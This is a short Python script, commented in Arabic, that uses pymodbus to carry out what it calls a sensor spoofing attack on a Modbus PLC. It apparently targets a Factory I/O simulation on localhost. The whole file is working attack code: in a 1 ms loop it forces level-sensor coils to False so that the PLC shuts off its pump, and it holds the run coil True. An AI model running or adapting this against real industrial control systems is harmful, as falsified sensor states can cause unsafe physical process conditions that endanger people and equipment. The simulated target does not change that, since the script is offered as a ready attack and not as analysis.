import time
from pymodbus.client import ModbusTcpClient

SERVER_IP = '127.0.0.1'

def main():
    client = ModbusTcpClient(SERVER_IP, port=502)
    if not client.connect():
        print("❌ فشل الاتصال بالهدف!")
        return

    print("☠️ بدء هجوم تزييف الحساسات (Sensor Spoofing)...")
    
    try:
        while True:
           # إعماء الحساس المتوسط (85%)
            client.write_coil(803, False)
            # إعماء الحساس الحرج (95%)
            client.write_coil(805, False)
            
            # الضربة القاضية: إعماء الحساس السفلي لإجبار الـ PLC على إطفاء المضخة!
            client.write_coil(804, False)
            
            # إبقاء النظام في وضع التشغيل
            client.write_coil(800, True)
            # سرعة جنونية (1 ميلي ثانية) لنتغلب على تحديثات Factory I/O
            time.sleep(0.001)
            
    except KeyboardInterrupt:
        print("\n🛑 تم إيقاف الهجوم.")
    finally:
        client.close()

if __name__ == '__main__':
    main()